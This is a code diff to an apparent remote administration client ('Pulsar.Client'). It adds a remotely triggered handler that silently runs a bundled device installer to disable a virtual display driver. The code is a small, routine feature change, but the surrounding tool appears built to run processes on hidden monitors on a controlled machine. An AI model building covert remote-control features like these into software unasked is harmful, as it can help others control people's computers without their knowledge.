@@ -105,6 +105,7 @@ namespace Pulsar.Client.Messages
                                                              message is DoDrawingEvent ||
                                                              message is GetMonitors ||
                                                              message is DoInstallVirtualMonitor ||
+                                                             message is DoUninstallVirtualMonitor ||
                                                              message is StartProcessOnMonitor;
 
         public override bool CanExecuteFrom(ISender sender) => true;
@@ -131,6 +132,9 @@ namespace Pulsar.Client.Messages
                     Execute(sender, msg);
                     break;
                 case DoInstallVirtualMonitor msg:
+                    Execute(sender, msg);
+                    break;
+                case DoUninstallVirtualMonitor msg:
                     Execute(sender, msg);
                     break;
                 case StartProcessOnMonitor msg:
@@ -583,6 +587,21 @@ namespace Pulsar.Client.Messages
             psi.RedirectStandardError = true;
 
             p = Process.Start(psi);
+            p.WaitForExit();
+        }
+
+        private void Execute(ISender client, DoUninstallVirtualMonitor message)
+        {
+            string extractPath = Path.Combine(Settings.DIRECTORY, "usbmmidd_v2", "usbmmidd_v2");
+            string installPath = Path.Combine(extractPath, "deviceinstaller64.exe");
+            // disable the driver
+            string arguments = "enableidd 0";
+            ProcessStartInfo psi = new ProcessStartInfo(installPath, arguments);
+            psi.UseShellExecute = false;
+            psi.RedirectStandardOutput = true;
+            psi.CreateNoWindow = true;
+            psi.RedirectStandardError = true;
+            Process p = Process.Start(psi);
             p.WaitForExit();
         }
 
